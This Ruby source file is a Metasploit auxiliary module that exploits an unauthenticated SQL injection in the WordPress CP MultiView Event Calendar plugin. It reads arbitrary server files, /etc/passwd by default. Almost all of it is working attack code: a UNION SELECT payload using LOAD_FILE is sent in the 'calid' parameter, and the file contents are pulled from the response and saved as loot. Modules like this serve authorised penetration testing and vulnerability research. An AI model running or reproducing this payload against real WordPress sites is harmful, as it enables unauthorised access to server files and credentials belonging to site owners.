##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress CP MultiView Event Calendar Arbitrary File Read via SQLi',
      'Description'    => %q{This module reads a file from the file system on vulnerable instances.

      This module exploits an unauthenticated SQL injection in order to read a file from the file
      system with permissions of the web server user. Likely requires a slightly misconfigured
      database in the that the DB user used by the Wordpress installation must have FILE permissions.
      This is a common misconfiguration.

      Categories: Wordpress, SQL Injection

      Price: 2

      Video: none

      OS: Multi

      Arch: Multi

      Requirements: Metasploit Framework
      },
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/35073/']
        ],
      'Author'         =>
        [
          'bperry',
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Oct 27 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to Wordpress', '/']),
        OptString.new('FILEPATH', [true, 'The filepath to read on the server', '/etc/passwd'])
      ], self.class)
  end

  def run

    left_marker = Rex::Text.rand_text_alpha(8)
    right_marker = Rex::Text.rand_text_alpha(8)

    get_file = " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(HEX(LOAD_FILE(0x#{datastore['FILEPATH'].unpack("H*")[0]})) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL#"

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/'),
      'vars_get' => {
        'cpmvc_id' => 1,
        'cpmvc_do_action' => 'mvparse',
        'f' => 'datafeed',
        'method' => 'list',
        'calid' => '1 '+get_file
      }
    })

    data = ''
    res.body.scan(/#{left_marker}(.*)#{right_marker}/).each do |file|
      data = file
    end

    data = data.pack('H*')

    path = store_loot('wordpress.file', 'binary/octet-stream', datastore['RHOST'], data, datastore['FILEPATH'])
    print_status ("File saved to #{path}.")
    print_status ("If the file is empty, the file may not exist on the server or the user does not have FILE permissions.")

  end
end

